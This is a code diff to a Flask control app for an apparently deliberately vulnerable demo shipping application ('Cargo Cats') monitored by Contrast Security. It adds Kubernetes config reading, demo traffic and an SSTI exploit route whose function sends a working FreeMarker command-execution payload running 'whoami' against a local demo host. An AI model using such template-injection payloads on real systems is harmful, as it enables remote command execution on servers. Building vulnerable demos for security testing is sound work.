@@ -12,6 +12,7 @@ import io
 import json
 import base64
 import re
+import yaml
 from typing import Dict, Optional
 from kubernetes import client, config
 
@@ -128,6 +129,36 @@ if contrast_api_authorization:
 else:
     logger.warning("Contrast API authorization not found in environment")
 
+
+def get_contrast_server_environment() -> str:
+    """Read server.environment from the Contrast agent operator's ClusterAgentConfiguration.
+
+    Returns the environment string (e.g. 'QA') or '' if unavailable, so the URL
+    can omit the &environment=... filter rather than break the landing page.
+    """
+    try:
+        custom = client.CustomObjectsApi()
+        # CRD is namespaced despite the "Cluster" prefix in its Kind
+        obj = custom.get_namespaced_custom_object(
+            group="agents.contrastsecurity.com",
+            version="v1beta1",
+            namespace="contrast-agent-operator",
+            plural="clusteragentconfigurations",
+            name="default-agent-configuration",
+        )
+        agent_yaml = obj.get("spec", {}).get("template", {}).get("spec", {}).get("yaml", "")
+        parsed = yaml.safe_load(agent_yaml) or {}
+        # `server:` with no children parses as None, so coalesce before .get
+        env = (parsed.get("server") or {}).get("environment") or ""
+        valid = {"QA", "PRODUCTION", "DEVELOPMENT"}
+        if env and env not in valid:
+            logger.warning(f"Ignoring invalid Contrast server.environment '{env}'; expected one of {sorted(valid)}")
+            return ""
+        return env
+    except Exception as e:
+        logger.warning(f"Could not read Contrast server environment from operator config: {e}")
+        return ""
+
 zap_url = "http://zapproxy:80"
 first_run = True
 scan_running = False
@@ -154,11 +185,14 @@ def hello_world():
     
     # Get CONTRAST__UNIQ__NAME from environment
     contrast_uniq_name = os.getenv('CONTRAST__UNIQ__NAME', '')
-    
+
     # Format the contrast URL with org ID and uniq name if available
     formatted_contrast_url = ''
     if contrast_org_id and contrast_uniq_name and contrast_base_url:
-        formatted_contrast_url = f"{contrast_base_url}/Contrast/cs/index.html#/{contrast_org_id}/explorer?search={contrast_uniq_name}-contrast-cargo-cats"
+        formatted_contrast_url = f"{contrast_base_url}/Contrast/cs/index.html#/{contrast_org_id}/explorer?search={contrast_uniq_name}-cargocats"
+        contrast_server_environment = get_contrast_server_environment()
+        if contrast_server_environment:
+            formatted_contrast_url += f"&environment={contrast_server_environment}"
     
     return render_template('index.html', 
                            contrast_url=formatted_contrast_url,
@@ -597,6 +631,35 @@ def exploit_deserialization():
     finally:
         exploit_running = False
 
+@app.route('/exploit/ssti')
+def exploit_ssti():
+    global exploit_running, exploit_state, exploit_output_buffer, stop_exploit_flag
+    
+    if exploit_running:
+        return jsonify({"status": "error", "message": "Exploit already running"}), 400
+    
+    exploit_running = True
+    exploit_state = "ssti_exploit"
+    
+    try:
+        session = requests.Session()
+        # Login first
+        login_result = run_login_exploit(session)
+        if not login_result:
+            log_exploit_output("Login failed - cannot proceed with SSTI exploit", "ERROR")
+            return jsonify({"status": "error", "message": "Login failed - cannot proceed with SSTI exploit"}), 500
+        
+        result = run_ssti_exploit(session)
+        exploit_state = "finished"
+        log_exploit_output(f"SSTI exploit completed - Success: {result}")
+        return jsonify({"status": "success", "message": "SSTI exploit completed", "result": result}), 200
+    except Exception as e:
+        exploit_state = "error"
+        log_exploit_output(f"SSTI exploit failed: {str(e)}", "ERROR")
+        return jsonify({"status": "error", "message": f"SSTI exploit failed: {str(e)}"}), 500
+    finally:
+        exploit_running = False
+
 @app.route('/exploit/list')
 def exploit_list():
     """List all available individual exploits"""
@@ -609,7 +672,8 @@ def exploit_list():
         {"name": "Log4Shell", "endpoint": "/exploit/log4shell", "description": "Log4j JNDI injection exploit"},
         {"name": "SSJS Injection", "endpoint": "/exploit/ssjs-injection", "description": "Server-side JavaScript injection"},
         {"name": "XXE", "endpoint": "/exploit/xxe", "description": "XML External Entity injection"},
-        {"name": "Insecure Deserialization", "endpoint": "/exploit/deserialization", "description": "Java Insecure Deserialization exploit using address import functionality"}
+        {"name": "Insecure Deserialization", "endpoint": "/exploit/deserialization", "description": "Java Insecure Deserialization exploit using address import functionality"},
+        {"name": "SSTI", "endpoint": "/exploit/ssti", "description": "FreeMarker Server-Side Template Injection (CVE-2025-64087)"}
     ]
     
     return jsonify({
@@ -684,8 +748,8 @@ def delete_all():
         
         logger.info(f"Filtering applications by unique name: {contrast_uniq_name}")
         
-        # Filter by unique name plus "-contrast-cargo-cats" suffix
-        filter_name = f"{contrast_uniq_name}-contrast-cargo-cats"
+        # Filter by unique name plus "-cargocats" suffix
+        filter_name = f"{contrast_uniq_name}-cargocats"
         logger.info(f"Using filter name: {filter_name}")
         
         applications_url = f"{contrast_base_url}/Contrast/api/ng/{contrast_org_id}/applications/filter?includeMerged=true"
@@ -1443,6 +1507,48 @@ def run_deserialization_exploit(session):
         log_exploit_output(f"Error during deserialization exploit: {str(e)}", "ERROR")
         return False
 
+def run_ssti_exploit(session):
+    """Execute FreeMarker SSTI exploit via report template generation (CVE-2025-64087)"""
+    log_exploit_output("Executing FreeMarker SSTI exploit via report template generation")
+    
+    try:
+        # Send malicious FreeMarker template that uses ?new to instantiate Execute class
+        ssti_payload = '${"freemarker.template.utility.Execute"?new()("whoami")}'
+        report_data = {
+            "template": ssti_payload,
+            "shipmentId": "SHIP-999",
+            "recipientName": "SSTI-Test",
+            "origin": "Exploit-Origin",
+            "destination": "Exploit-Dest"
+        }
+        r = session.post("http://cargocats.localhost/api/reports/generate", json=report_data, timeout=10, allow_redirects=False)
+        log_exploit_output(f"SSTI exploit response status: {r.status_code}")
+        log_exploit_output(f"SSTI exploit response body: {r.text[:500] if r.text else 'Empty'}")
+        
+        if r.status_code == 200:
+            try:
+                response_data = r.json()
+                output = response_data.get("output", "")
+                # If the template executed whoami, the output will contain a username instead of the template literal
+                if output and ssti_payload not in output and len(output.strip()) > 0:
+                    log_exploit_output(f"SUCCESS: SSTI exploit appears successful (command output: {output.strip()})")
+                    return True
+                else:
+                    log_exploit_output("WARNING: SSTI response received but command execution unclear")
+                    return False
+            except:
+                log_exploit_output("Could not parse SSTI response for analysis")
+                return False
+        elif r.status_code == 500:
+            # A 500 with an error about Execute class still indicates the SSTI was processed
+            log_exploit_output("SSTI payload was processed by the template engine (server error may indicate partial success)")
+            return True
+        
+        return False
+    except Exception as e:
+        log_exploit_output(f"Error during SSTI exploit: {str(e)}", "ERROR")
+        return False
+
 ########################################
 # exploits
 ########################################
@@ -1552,6 +1658,14 @@ def exploit():
         if check_exploit_stop("Deserialization"):
             return
         run_deserialization_exploit(session)
+
+        # ================================================
+        # SSTI EXPLOIT (CVE-2025-64087)
+        # ================================================
+        exploit_state = "ssti_exploit"
+        if check_exploit_stop("SSTI"):
+            return
+        run_ssti_exploit(session)
 
         exploit_state = "finished"
         log_exploit_output("Exploit execution completed successfully")
@@ -1893,6 +2007,42 @@ def traffic():
         r = session.post("http://cargocats.localhost/api/labels/generate", json=label_data, timeout=10, allow_redirects=False)
         log_traffic_output(f"Label generation API POST - Status: {r.status_code}")
         
+        # ================================================
+        # PHASE 9: REPORT GENERATION
+        # ================================================
+        traffic_state = "report_generation"
+        log_traffic_output("Phase 9: Report generation")
+        
+        # Visit reports page
+        r = session.get("http://cargocats.localhost/reports", timeout=5, allow_redirects=False)
+        log_traffic_output(f"Visited reports page - Status: {r.status_code}")
+        
+        # Check report service health
+        r = session.get("http://cargocats.localhost/api/reports/health", timeout=5, allow_redirects=False)
+        log_traffic_output(f"Report service health check - Status: {r.status_code}")
+        
+        # Generate a normal shipping report
+        report_data = {
+            "template": "Cargo Cats Shipping Report\n\nShipment ID: ${shipmentId}\nRecipient: ${recipientName}\nFrom: ${origin}\nTo: ${destination}\nDate: ${date}\nCarrier: ${company}\n\nStatus: In Transit",
+            "shipmentId": "SHIP-48460B74",
+            "recipientName": "Jane Smith",
+            "origin": "Portland, OR",
+            "destination": "Austin, TX"
+        }
+        r = session.post("http://cargocats.localhost/api/reports/generate", json=report_data, timeout=10, allow_redirects=False)
+        log_traffic_output(f"Report generation POST - Status: {r.status_code}")
+        
+        # Generate a second report with different data
+        report_data_2 = {
+            "template": "Delivery Confirmation\n\nPackage ${shipmentId} for ${recipientName} has been delivered from ${origin} to ${destination}.",
+            "shipmentId": "SHIP-7B3F19A2",
+            "recipientName": "Bob Johnson",
+            "origin": "Seattle, WA",
+            "destination": "Denver, CO"
+        }
+        r = session.post("http://cargocats.localhost/api/reports/generate", json=report_data_2, timeout=10, allow_redirects=False)
+        log_traffic_output(f"Second report generation POST - Status: {r.status_code}")
+
         traffic_state = "finished"
         log_traffic_output("Traffic generation completed successfully")
         
